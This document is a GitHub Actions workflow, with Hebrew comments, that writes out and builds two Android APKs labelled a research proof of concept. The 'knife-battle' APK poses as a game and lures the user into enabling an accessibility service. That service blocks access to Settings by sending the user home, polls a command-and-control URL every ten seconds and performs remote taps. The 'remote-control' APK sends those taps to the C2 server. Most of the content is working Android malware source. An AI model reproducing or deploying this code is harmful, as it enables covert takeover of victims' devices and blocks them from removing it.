name: Create Full Android PoC & Build APKs

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      # יצירת כל המבנה + הקבצים מאפס
      - name: Generate complete Android project from scratch
        run: |
          # settings.gradle
          cat > settings.gradle << 'EOT'
          rootProject.name = "PoC"
          include ':app'
          EOT

          # build.gradle (project level)
          cat > build.gradle << 'EOT'
          plugins {
              id 'com.android.application' version '8.7.1' apply false
          }
          EOT

          # app/build.gradle - עם שמות APK
          mkdir -p app/src/main/java/com/research/lab/victim
          mkdir -p app/src/main/java/com/research/lab/controller
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values

          cat > app/build.gradle << 'EOT'
          plugins {
              id 'com.android.application'
          }

          android {
              compileSdk 35
              namespace 'com.research.lab'

              defaultConfig {
                  applicationId "com.research.lab"
                  minSdk 30
                  targetSdk 35
                  versionCode 1
                  versionName "1.0-poc"
              }

              flavorDimensions = ["type"]
              productFlavors {
                  victim {
                      dimension "type"
                      applicationIdSuffix ".victim"
                      archivesBaseName = "knife-battle"          # APK של הנשלטת (משחק מזויף)
                  }
                  controller {
                      dimension "type"
                      applicationIdSuffix ".controller"
                      archivesBaseName = "remote-control"        # APK של השולטת
                  }
              }

              buildTypes {
                  debug {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.7.0'
              implementation 'androidx.core:core:1.13.1'
          }
          EOT

          # AndroidManifest.xml - עדכון לשמות החדשים
          cat > app/src/main/AndroidManifest.xml << 'EOT'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />

              <application android:allowBackup="false" android:label="PoC">

                  <!-- Victim - jhome.java (knife-battle) -->
                  <activity android:name=".victim.jhome$LoadingActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service android:name=".victim.jhome$StealthService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <!-- Controller - manager.java -->
                  <activity android:name=".controller.manager" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

              </application>
          </manifest>
          EOT

          # accessibility_config.xml
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOT'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeWindowStateChanged"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:notificationTimeout="100"
              android:canPerformGestures="true"
              android:description="@string/accessibility_desc" />
          EOT

          # strings.xml
          cat > app/src/main/res/values/strings.xml << 'EOT'
          <resources>
              <string name="app_name">PoC</string>
              <string name="accessibility_desc">Research PoC Accessibility Service</string>
          </resources>
          EOT

          # Victim - jhome.java (מכיל גם LoadingActivity וגם StealthService)
          cat > app/src/main/java/com/research/lab/victim/jhome.java << 'EOT'
          package com.research.lab.victim;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.GestureDescription;
          import android.app.Activity;
          import android.content.Intent;
          import android.graphics.Path;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.Gravity;
          import android.view.View;
          import android.widget.Button;
          import android.widget.LinearLayout;
          import android.widget.TextView;
          import java.io.BufferedReader;
          import java.io.InputStreamReader;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import org.json.JSONObject;

          public class jhome {

              private static final String TAG = "KnifeBattle";
              private static final String C2_URL = "http://192.168.1.100:8000/cmd";

              // Loading Activity (מסך מזויף)
              public static class LoadingActivity extends Activity {
                  @Override
                  protected void onCreate(Bundle savedInstanceState) {
                      super.onCreate(savedInstanceState);
                      LinearLayout ll = new LinearLayout(this);
                      ll.setOrientation(LinearLayout.VERTICAL);
                      ll.setGravity(Gravity.CENTER);

                      TextView tv = new TextView(this);
                      tv.setText("Loading game...");
                      tv.setTextSize(22);
                      ll.addView(tv);

                      Button btn = new Button(this);
                      btn.setText("Enable Accessibility");
                      btn.setVisibility(View.GONE);
                      ll.addView(btn);

                      setContentView(ll);

                      new Handler(Looper.getMainLooper()).postDelayed(() -> {
                          tv.setText("Enable in Settings to play");
                          btn.setVisibility(View.VISIBLE);
                      }, 3000);

                      btn.setOnClickListener(v -> 
                          startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
                      );
                  }
              }

              // Stealth Service (המנגנון העיקרי)
              public static class StealthService extends AccessibilityService {
                  private long last = 0;

                  @Override
                  public void onAccessibilityEvent(AccessibilityEvent e) {
                      if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                          String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
                          if (pkg.contains("com.android.settings")) {
                              performGlobalAction(GLOBAL_ACTION_HOME);
                          }
                      }

                      long now = System.currentTimeMillis();
                      if (now - last > 10000) {
                          last = now;
                          new Thread(this::pollC2).start();
                      }
                  }

                  private void pollC2() {
                      try {
                          URL url = new URL(C2_URL);
                          HttpURLConnection c = (HttpURLConnection) url.openConnection();
                          c.setRequestMethod("GET");
                          if (c.getResponseCode() == 200) {
                              BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                              StringBuilder sb = new StringBuilder();
                              String line;
                              while ((line = br.readLine()) != null) sb.append(line);
                              handle(sb.toString());
                              br.close();
                          }
                          c.disconnect();
                      } catch (Exception ignored) {}
                  }

                  private void handle(String json) {
                      try {
                          JSONObject o = new JSONObject(json);
                          if ("tap".equals(o.optString("action"))) {
                              float x = (float) o.optDouble("x", 540);
                              float y = (float) o.optDouble("y", 960);
                              Path p = new Path();
                              p.moveTo(x, y);
                              GestureDescription gd = new GestureDescription.Builder()
                                  .addStroke(new GestureDescription.StrokeDescription(p, 0, 60))
                                  .build();
                              dispatchGesture(gd, null, null);
                          }
                      } catch (Exception ignored) {}
                  }

                  @Override
                  public void onInterrupt() {}
              }
          }
          EOT

          # Controller - manager.java (השם שביקשת)
          cat > app/src/main/java/com/research/lab/controller/manager.java << 'EOT'
          package com.research.lab.controller;

          import android.app.Activity;
          import android.os.Bundle;
          import android.view.MotionEvent;
          import android.view.View;
          import android.widget.LinearLayout;
          import android.widget.TextView;
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import org.json.JSONObject;

          public class manager extends Activity {
              private TextView tv;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);

                  LinearLayout root = new LinearLayout(this);
                  root.setOrientation(LinearLayout.VERTICAL);
                  root.setPadding(40, 40, 40, 40);

                  tv = new TextView(this);
                  tv.setText("Touch to control target");
                  tv.setTextSize(18);
                  root.addView(tv);

                  View area = new View(this);
                  area.setBackgroundColor(0x220000FF);
                  LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
                      LinearLayout.LayoutParams.MATCH_PARENT, 1400);
                  area.setLayoutParams(p);
                  root.addView(area);

                  setContentView(root);

                  area.setOnTouchListener((v, e) -> {
                      if (e.getAction() == MotionEvent.ACTION_DOWN || e.getAction() == MotionEvent.ACTION_MOVE) {
                          float x = e.getX();
                          float y = e.getY();
                          tv.setText(String.format("X:%.0f Y:%.0f", x, y));
                          send(x, y);
                          return true;
                      }
                      return false;
                  });
              }

              private void send(float x, float y) {
                  new Thread(() -> {
                      try {
                          JSONObject o = new JSONObject();
                          o.put("action", "tap");
                          o.put("x", x);
                          o.put("y", y);

                          URL url = new URL("http://192.168.1.100:8000/cmd");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setDoOutput(true);
                          conn.setRequestProperty("Content-Type", "application/json");

                          try (OutputStream os = conn.getOutputStream()) {
                              os.write(o.toString().getBytes("UTF-8"));
                          }
                          conn.disconnect();
                      } catch (Exception ignored) {}
                  }).start();
              }
          }
          EOT

      # בנייה
      - name: Setup JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: current

      - name: Build knife-battle APK (Victim - jhome)
        run: gradle assembleVictimDebug

      - name: Build remote-control APK (Controller - manager)
        run: gradle assembleControllerDebug

      - name: Upload APKs
        uses: actions/upload-artifact@v4
        with:
          name: apks
          path: |
            app/build/outputs/apk/victim/debug/knife-battle-debug.apk
            app/build/outputs/apk/controller/debug/remote-control-debug.apk
